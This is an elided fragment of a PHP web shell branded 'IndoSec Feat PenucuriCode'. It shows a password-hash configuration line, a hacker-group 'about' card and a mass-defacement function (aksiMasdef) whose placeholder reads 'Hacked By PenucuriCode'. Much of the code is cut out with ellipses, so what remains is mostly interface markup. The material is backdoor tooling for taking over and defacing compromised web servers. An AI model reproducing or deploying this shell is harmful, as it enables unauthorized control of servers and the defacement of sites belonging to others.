...
/* Configurasi */
$aupas      = "bfefbf84897427a7e7a39052a8a9efdd";// penucuricode
...
<html>
  <head>
    ...
    <title>IndoSec Feat PenucuriCode</title>
  ...
  <body class="bg-dark text-center text-light">
    <div class="container text-center mt-3">
      <h1>[+] IndoSec Feat PenucuriCode [+]</h1>
...
function about(){
  echo '<div class="card text-center bg-light about">
    <h4 class="card-header">{ IndoSec Feat PenucuriCode }</h4>
    <div class="card-body">
      <center><div class="img"></div></center>
      <p class="card-text">{ IndoSec Feat PenucuriCode } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem dan Mencuri Sistem.</p>
    </div>
    <div class="card-footer">
      <small class="card-text text-muted">Copyright 2021 { IndoSec Feat PenucuriCode }</small>
    </div>
  </div><br/>';
  exit;
}
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
  ...
  if($_POST['start']){
    ...
    echo "<form method='post'>
      ...
      <textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By PenucuriCode - Meow404'></textarea><br/>
  ...
  <body class="bg-dark text-light">
    ...
    <nav class="navbar static-top navbar-dark">
      ...
      <div class="collapse navbar-collapse" id="info">
        <ul>
          <a href="https://www.101computing.net/wp/wp-content/uploads/access-denied.png" class="lain"><i class="fa fa-facebook tambah"></i></a>
          <a href="https://www.101computing.net/wp/wp-content/uploads/access-denied.png" class="lain"><i class="fa fa-instagram tambah"></i></a>
          <a href="https://www.101computing.net/wp/wp-content/uploads/access-denied.png" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
          <a href="https://github.com/penucuriCode" class="lain"><i class="fa fa-github tambah"></i></a>
          <a href="https://www.101computing.net/wp/wp-content/uploads/access-denied.png" class="lain"><i class="fa fa-globe tambah"></i></a>
        </ul>
      </div>
    </nav>
    <?php
    echo '<div class="container">
      <h1 class="text-center"><a href="https://github.com/penucuriCode" style="color:#ffffff;">[+] IndoSec Feat PenucuriCode [+]</h1>
